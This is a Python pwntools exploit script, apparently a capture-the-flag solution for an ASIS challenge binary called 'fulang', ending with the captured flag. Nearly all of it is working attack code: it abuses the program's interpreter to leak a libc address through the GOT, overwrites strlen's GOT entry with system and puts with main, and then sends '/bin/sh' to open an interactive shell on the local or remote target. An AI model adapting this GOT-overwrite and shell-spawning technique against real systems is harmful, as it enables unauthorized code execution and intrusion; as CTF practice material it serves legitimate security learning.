from pwn import *
from ctypes import *

DEBUG = 1
if DEBUG:
     p = process('./fulang')
     context.log_level = 'debug'
else:
     p = remote('69.90.132.40', 4000)

strlen_got=0x0804a020
main_addr=0x80486DE
def pwn():
    gdb.attach(p,'b *0x80487F5')#80487E6')
    p.recvuntil('code:')
    
    p.send(':<'*32+':.'+':::>'*4+':<:.'*4+':<'*4+':.:>'*4+'\n')
    p.send('\x20')
    # :< *32 change fu point from 0x804A080 to 0x804A060
    # :. and input 0x20,change it point to 0x804a20(strlen got)
    # :::> leak strlen addr each byte one time
    # :<:. change the strlen got to system addr
    # :< change fu point to 0x804a20(puts got)
    # :.:> change puts got to main addr
    data=p.recv(4)
    sleep(1)
    
    strlen_addr=u32(data)
    libc=ELF("/lib32/libc-2.24.so")
    libc_base = strlen_addr - 0x7e880
    system_addr = libc_base + libc.symbols['system']
    puts_addr = libc_base + libc.symbols['puts']
    
    p.send(p32(system_addr)[::-1])
    p.send(p32(main_addr))
    p.send('/bin/sh;\n')
    p.interactive()



if __name__ == '__main__':
   pwn()

##ASIS{e77c4a76d8079b330e7e78e8e3f434c4}

 
    

